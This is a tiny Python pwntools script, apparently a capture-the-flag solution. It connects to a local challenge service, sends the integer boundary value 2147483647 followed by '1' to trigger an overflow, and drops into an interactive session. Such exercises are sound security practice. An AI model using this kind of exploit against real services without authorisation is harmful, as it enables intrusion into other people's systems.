from pwn import *


p=remote("localhost",10001)

p.sendline("2147483647")

p.sendline("1")


p.interactive()